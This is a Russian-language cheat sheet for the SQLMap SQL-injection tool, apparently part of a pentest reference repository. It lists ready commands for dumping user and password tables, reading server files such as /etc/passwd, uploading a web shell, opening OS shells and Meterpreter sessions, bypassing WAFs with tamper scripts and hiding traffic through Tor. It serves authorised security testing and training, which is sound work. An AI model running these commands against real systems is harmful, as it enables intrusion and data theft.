<a id="-sqlmap---complete-cheatsheet"></a>
# 💉 SQLMap — полная шпаргалка

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
[🇬🇧 English](../README.md) • [🇷🇺 Русский раздел](../../README.ru.md)

> **Уточнения к примерам:** параметры зависят от версии и возможностей СУБД. В [официальном руководстве SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage) --output-dir задаёт каталог, а не формат HTML; поэтому подпись «Save to HTML» исходного примера неточна. В строке чтения реестра оригинал содержит -reg-key вместо документированного --reg-key. Команды оставлены без исправлений.

> **Уровень проверок:** --level определяет набор и глубину проверок, а не безусловную проверку каждого возможного параметра; --risk=3 добавляет проверки с OR, которые могут менять данные. --batch выбирает ответы по умолчанию, а не гарантирует успешную эксплуатацию. Работа с файлами и ОС зависит от прав и возможностей СУБД. Скрипты tamper не гарантируют обход WAF; --identify-waf отсутствует в текущем списке параметров Usage; варианты запуска сверяйте с выбранной версией.

> **Оформление:** таблица tamper сохраняет техническое значение ||; вертикальные черты экранированы только для корректной ячейки [GitHub Markdown](https://github.github.com/gfm/#example-200). Automatic SQL Injection Tool на ASCII-эмблеме означает «инструмент автоматизации SQL-инъекций»; рисунок сохранён.


[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Automatic SQL Injection Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 Мощный инструмент автоматизации SQL-инъекций</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Введение](#-introduction)
- [Установка](#-installation)
- [Основной синтаксис](#-basic-syntax)
- [Параметры цели](#-target-options)
- [Параметры запросов](#-request-options)
- [Параметры обнаружения](#-detection-options)
- [Сбор сведений](#-enumeration)
- [Извлечение данных](#-data-extraction)
- [Операции с файлами](#-file-operations)
- [Доступ к операционной системе](#-os-access)
- [Методы обхода ограничений](#-bypass-techniques)
- [Скрипты преобразования полезной нагрузки (tamper)](#common-tamper-scripts)
- [Практические примеры](#-real-world-examples)
- [Краткий справочник](#-quick-reference)
- [Советы и рекомендуемые практики](#-tips--best-practices)
- [Полезные материалы](#-resources)

---

<a id="-introduction"></a>
## 🎯 Введение

**SQLMap** — инструмент тестирования на проникновение с открытым исходным кодом, автоматизирующий обнаружение и эксплуатацию SQL-инъекций.

<a id="key-features"></a>
### Основные возможности

| Возможность | Описание |
| --------- | ------------- |
| **Автоматическое обнаружение** | Автоматическое обнаружение SQL-инъекций |
| **Поддержка СУБД** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite и другие |
| **Расширенные возможности после обнаружения инъекции** | Определение СУБД, извлечение данных и доступ к ОС |
| **Методы обхода ограничений** | Преобразование полезной нагрузки скриптами tamper для проверки обхода WAF/IPS |
| **Несколько типов инъекций** | Логические, на основе ошибок, UNION, составные и временные |

<a id="supported-databases"></a>
### Поддерживаемые СУБД

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

<a id="sql-injection-types"></a>
### Типы SQL-инъекций

| Тип | Код | Описание |
| ------ | ------ | ------------- |
| Слепая инъекция по логическим условиям | `B` | Различия ответов для истинного и ложного условий |
| На основе ошибок | `E` | Ошибки СУБД в ответе |
| На основе UNION-запросов | `U` | Инъекция с UNION SELECT |
| Составные запросы | `S` | Несколько запросов (;) |
| Слепая инъекция по времени ответа | `T` | Задержки ответа |
| Вложенные запросы | `Q` | Встроенные (вложенные) запросы |

---

<a id="-installation"></a>
## 📥 Установка

<a id="kali-linux-pre-installed"></a>
### Kali Linux (предустановлен)
```bash
# Обновить SQLMap
sudo apt update && sudo apt install sqlmap
```

<a id="from-github-latest-version"></a>
### Из GitHub (последняя версия)
```bash
# Клонировать репозиторий
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Запустить SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

<a id="using-pip"></a>
### С помощью pip
```bash
pip install sqlmap
```

<a id="docker"></a>
### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

<a id="verify-installation"></a>
### Проверка установки
```bash
sqlmap --version
sqlmap -h          # Краткая справка
sqlmap -hh         # Расширенная справка
```

---

<a id="-basic-syntax"></a>
## ⌨️ Основной синтаксис

<a id="general-syntax"></a>
### Общий синтаксис
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

<a id="quick-start-examples"></a>
### Примеры быстрого старта
```bash
# Базовая проверка
sqlmap -u "http://target.com/page.php?id=1"

# Проверка с Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Проверка POST-запроса
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Проверка из файла
sqlmap -r request.txt

# Полностью автоматический режим
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

<a id="-target-options"></a>
## 🎯 Параметры цели

<a id="url-target--u"></a>
### Целевой URL (-u)
```bash
# Базовый URL
sqlmap -u "http://target.com/page.php?id=1"

# Несколько параметров
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Указать проверяемый параметр
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Проверить все параметры (подпись оригинала; см. уточнение)
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

<a id="request-file--r"></a>
### Файл запроса (-r)
```bash
# Сохранить запрос Burp Suite в файл
# Затем проверить:
sqlmap -r request.txt

# Пример файла запроса:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

<a id="google-dork--g"></a>
### Поисковый запрос Google (-g)
```bash
# Найти и проверить результаты Google
sqlmap -g "inurl:page.php?id="

# С конкретными страницами
sqlmap -g "inurl:product.php?id= site:target.com"
```

<a id="direct-database-connection--d"></a>
### Прямое подключение к СУБД (-d)
```bash
# Подключиться непосредственно к СУБД
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

<a id="bulk-targets--m"></a>
### Список целей (-m)
```bash
# Файл с несколькими URL
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

<a id="configuration-file--c"></a>
### Файл конфигурации (-c)
```bash
# Использовать файл конфигурации
sqlmap -c sqlmap.conf
```

---

<a id="-request-options"></a>
## 📡 Параметры запросов

<a id="http-method--data"></a>
### Метод HTTP и данные
```bash
# Данные POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Указать метод
sqlmap -u "http://target.com/api/user/1" --method=PUT

# Данные JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

<a id="cookies"></a>
### Cookie
```bash
# Один Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Несколько Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Загрузить Cookie из файла
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Проверить параметр Cookie
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

<a id="headers"></a>
### Заголовки
```bash
# Собственный заголовок
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Несколько заголовков
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Случайный User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

<a id="authentication"></a>
### Аутентификация
```bash
# Аутентификация Basic
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Аутентификация Digest
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# Аутентификация NTLM
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

<a id="proxy"></a>
### Прокси
```bash
# HTTP-прокси
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS-прокси
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Проверить Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

<a id="-detection-options"></a>
## 🔍 Параметры обнаружения

<a id="level--risk"></a>
### Уровень и риск
```bash
# Уровень (1-5) — число проверок
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Риск (1-3) — потенциальное воздействие проверок
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# В оригинале рекомендуется для подробной проверки (см. уточнение)
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Уровень | Проверки |
| ------- | ------- |
| 1 | По умолчанию — базовые проверки |
| 2 | + Проверка Cookie |
| 3 | + Проверка User-Agent и Referer |
| 4 | + Больше полезных нагрузок |
| 5 | + Все полезные нагрузки из предусмотренного набора |

| Риск | Описание |
| ------ | ------------- |
| 1 | По умолчанию — проверки с меньшим риском |
| 2 | + Ресурсоёмкие временные проверки |
| 3 | + Проверки с OR (могут изменить данные!) |

<a id="technique-selection"></a>
### Выбор техники
```bash
# Конкретная техника
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Только Union
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Только логические условия
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Только на основе ошибок
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Только по времени ответа
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Только составные запросы

# Несколько техник
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Все техники (по умолчанию)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

<a id="time-delays"></a>
### Временные задержки
```bash
# Время для временной инъекции (по умолчанию: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Задержка между запросами
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

<a id="threads"></a>
### Потоки
```bash
# Параллельные соединения (по умолчанию: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

<a id="-enumeration"></a>
## 📊 Сбор сведений

<a id="database-enumeration"></a>
### Сбор сведений о базах данных
```bash
# Получить текущую базу данных
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Получить текущего пользователя
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Проверить, имеет ли пользователь права DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Перечислить все базы данных
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Перечислить всех пользователей
sqlmap -u "http://target.com/page.php?id=1" --users

# Перечислить пароли пользователей
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Перечислить привилегии
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Перечислить роли
sqlmap -u "http://target.com/page.php?id=1" --roles
```

<a id="table-enumeration"></a>
### Сбор сведений о таблицах
```bash
# Перечислить таблицы базы данных
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Перечислить все таблицы
sqlmap -u "http://target.com/page.php?id=1" --tables

# Подсчитать записи таблиц
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

<a id="column-enumeration"></a>
### Сбор сведений о столбцах
```bash
# Перечислить столбцы таблицы
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Поиск имён столбцов
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

<a id="schema-dump"></a>
### Извлечение схемы
```bash
# Выгрузить схему базы данных
sqlmap -u "http://target.com/page.php?id=1" --schema

# Исключить системные базы данных
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

<a id="-data-extraction"></a>
## 📤 Извлечение данных

<a id="dump-data"></a>
### Выгрузка данных
```bash
# Выгрузить определённую таблицу
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Выгрузить определённые столбцы
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Выгрузить все таблицы базы данных
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Выгрузить всё
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Исключить системные базы данных
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

<a id="limit-results"></a>
### Ограничение результатов
```bash
# Первые 10 строк
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Строки 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# Условие WHERE
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

<a id="custom-sql-queries"></a>
### Произвольные SQL-запросы
```bash
# Выполнить SQL-запрос
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Интерактивная оболочка SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

<a id="output-formats"></a>
### Форматы вывода
```bash
# Сохранить в CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Сохранить в HTML (подпись оригинала; см. уточнение)
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

<a id="-file-operations"></a>
## 📁 Операции с файлами

<a id="read-files"></a>
### Чтение файлов
```bash
# Прочитать файл сервера
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Прочитать файлы Windows
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Прочитать конфигурацию веб-приложения
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

<a id="write-files"></a>
### Запись файлов
```bash
# Записать файл на сервер
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Загрузить веб-оболочку
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

<a id="-os-access"></a>
## 💻 Доступ к операционной системе

<a id="command-execution"></a>
### Выполнение команд
```bash
# Выполнить команду ОС
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Интерактивная оболочка
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell в Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

<a id="meterpreter-session"></a>
### Сеанс Meterpreter
```bash
# Получить сеанс Meterpreter
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# С определёнными параметрами
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

<a id="smb-relay"></a>
### Ретрансляция SMB (SMB Relay)
```bash
# Атака ретрансляции SMB
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

<a id="registry-access-windows"></a>
### Доступ к реестру (Windows)
```bash
# Прочитать реестр
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Добавить ключ реестра
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Удалить ключ реестра
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Методы обхода ограничений

<a id="wafips-bypass"></a>
### Обход WAF/IPS
```bash
# Определить WAF (устаревший пример оригинала)
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Пропустить обнаружение WAF
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Случайный регистр
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Несколько скриптов tamper
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

<a id="common-tamper-scripts"></a>
### Распространённые скрипты tamper
```bash
# URL-кодирование
--tamper=charencode

# Двойное URL-кодирование
--tamper=chardoubleencode

# Unicode-кодирование
--tamper=charunicodeencode

# Заменить пробелы комментариями
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Изменение регистра
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Заменить ключевые слова
--tamper=between
--tamper=equaltolike
```

<a id="tamper-scripts-reference"></a>
### Справочник скриптов tamper

| Скрипт | Описание |
| -------- | ------------- |
| `apostrophemask` | Заменить апостроф представлением UTF-8 |
| `apostrophenullencode` | Заменить апостроф двойным Unicode-представлением |
| `base64encode` | Кодировать полезную нагрузку в Base64 |
| `between` | Заменить `>` на `NOT BETWEEN 0 AND #` |
| `charencode` | URL-кодировать все символы |
| `charunicodeencode` | Unicode-URL-кодирование |
| `concat2concatws` | Заменить `CONCAT` на `CONCAT_WS` |
| `equaltolike` | Заменить `=` на `LIKE` |
| `greatest` | Заменить `>` на `GREATEST` |
| `halfversionedmorekeywords` | Добавить версионный комментарий MySQL |
| `ifnull2ifisnull` | Заменить `IFNULL` на `IF(ISNULL())` |
| `lowercase` | Перевести ключевые слова в нижний регистр |
| `modsecurityversioned` | Обход ModSecurity с помощью версионного комментария |
| `modsecurityzeroversioned` | Обход ModSecurity с помощью комментария с нулевой версией |
| `percentage` | Добавить знак процента перед символами |
| `randomcase` | Случайный регистр ключевых слов |
| `randomcomments` | Добавить случайные комментарии в ключевые слова SQL |
| `securesphere` | Добавить специальную строку для проверки обхода SecureSphere |
| `space2comment` | Заменить пробел на `/**/` |
| `space2dash` | Заменить пробел комментарием с дефисами `--` |
| `space2hash` | Заменить пробел комментарием `#` |
| `space2morehash` | Заменить пробел на `#` и перевод строки |
| `space2mssqlblank` | Заменить пробел пробельными символами MSSQL |
| `space2mssqlhash` | Заменить пробел на `#` и перевод строки (MSSQL) |
| `space2plus` | Заменить пробел на `+` |
| `space2randomblank` | Заменить пробел случайным пробельным символом |
| `symboliclogical` | Заменить `AND`/`OR` на `&&`/`\|\|` |
| `unionalltounion` | Заменить `UNION ALL` на `UNION` |
| `unmagicquotes` | Заменить кавычку многобайтовым `%bf%27` |
| `uppercase` | Перевести ключевые слова в верхний регистр |
| `versionedkeywords` | Заключить ключевые слова в версионный комментарий |
| `versionedmorekeywords` | Заключить больше ключевых слов в версионный комментарий |
| `xforwardedfor` | Добавить поддельный заголовок `X-Forwarded-For` |

---

<a id="-real-world-examples"></a>
## 🎬 Практические примеры

<a id="example-1-basic-scan"></a>
### Пример 1: базовая проверка
```bash
# Проверка в автоматическом режиме
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

<a id="example-2-full-database-dump"></a>
### Пример 2: полная выгрузка базы данных
```bash
# Собрать сведения и выгрузить данные
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# После обнаружения базы данных
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Выгрузить таблицу users
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

<a id="example-3-post-request-with-cookie"></a>
### Пример 3: POST-запрос с Cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

<a id="example-4-through-burp-proxy"></a>
### Пример 4: через прокси Burp
```bash
# Сохранить запрос Burp в файл, затем:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

<a id="example-5-waf-bypass"></a>
### Пример 5: обход WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

<a id="example-6-get-os-shell"></a>
### Пример 6: получение оболочки ОС
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

<a id="example-7-read-sensitive-files"></a>
### Пример 7: чтение конфиденциальных файлов
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-commands"></a>
### Основные команды

| Команда | Описание |
| --------- | ------------- |
| `-u URL` | Целевой URL с параметром |
| `-r FILE` | Загрузить запрос из файла |
| `--data=DATA` | Данные POST |
| `--cookie=COOKIE` | HTTP Cookie |
| `--dbs` | Перечислить базы данных |
| `--tables` | Перечислить таблицы |
| `--columns` | Перечислить столбцы |
| `--dump` | Выгрузить данные |
| `-D DB` | Указать базу данных |
| `-T TABLE` | Указать таблицу |
| `-C COLS` | Указать столбцы |
| `--batch` | Неинтерактивный режим |

<a id="detection-options"></a>
### Параметры обнаружения

| Параметр | Описание |
| -------- | ------------- |
| `--level=LEVEL` | Уровень проверок (1-5) |
| `--risk=RISK` | Уровень риска (1-3) |
| `-p PARAM` | Проверяемый параметр |
| `--technique=TECH` | Техника инъекции |
| `--threads=N` | Параллельные потоки |

<a id="output-options"></a>
### Параметры вывода

| Параметр | Описание |
| -------- | ------------- |
| `-v LEVEL` | Подробность вывода (0-6) |
| `--batch` | Не запрашивать ввод пользователя |
| `--flush-session` | Очистить кеш сеанса |
| `--output-dir=DIR` | Заданный каталог вывода |

---

<a id="-tips--best-practices"></a>
## 💡 Советы и рекомендуемые практики

<a id="performance-tips"></a>
### Советы по производительности

1. **Начинайте с простого**
   ```bash
   # Начать с низкого уровня
   sqlmap -u "URL" --level=1 --batch
   # При необходимости увеличить
   ```

2. **Используйте --batch для автоматизации**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Экономьте время, выбирая конкретные проверки**
   ```bash
   # Проверить только технику Union
   sqlmap -u "URL" --technique=U
   ```

<a id="stealth-tips"></a>
### Советы по снижению заметности

1. **Случайный User-Agent**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Добавляйте задержку**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Используйте Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

<a id="troubleshooting"></a>
### Устранение неполадок

| Проблема | Решение |
| ------- | ---------- |
| Инъекция не обнаружена | Увеличить `--level` и `--risk` |
| Блокировка WAF | Использовать скрипты `--tamper` |
| Медленная проверка | Уменьшить `--level`, выбрать конкретную `--technique` |
| Проблемы подключения | Проверить `--timeout`, `--retries` |

---

<a id="-legal-disclaimer"></a>
## ⚠️ Правовая оговорка

> **ПРЕДУПРЕЖДЕНИЕ:** SQLMap — мощный инструмент, который следует использовать только **для разрешённого тестирования**.
> 
> - ✅ Проверяйте собственные системы
> - ✅ Получайте явное письменное разрешение
> - ✅ Используйте в законных проектах тестирования на проникновение
> - ❌ Не используйте на системах без разрешения
> - ❌ Не используйте со злым умыслом
> 
> **Несанкционированный доступ к компьютерным системам незаконен и влечёт ответственность по закону.**

---

<a id="-resources"></a>
## 📚 Полезные материалы

<a id="official-resources"></a>
### Официальные материалы
- [Официальный сайт SQLMap](https://sqlmap.org/)
- [SQLMap на GitHub](https://github.com/sqlmapproject/sqlmap)
- [Вики SQLMap](https://github.com/sqlmapproject/sqlmap/wiki)

<a id="learning-resources"></a>
### Учебные материалы
- [SQL-инъекции OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL-инъекции PortSwigger](https://portswigger.net/web-security/sql-injection)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Metasploit Framework](../../Metasploit/translations/README.ru.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.ru.md)

---

<p align="center">
  <b>💉 Освойте тестирование SQL-инъекций!</b><br>
  <i>Большая сила предполагает большую ответственность</i>
</p>
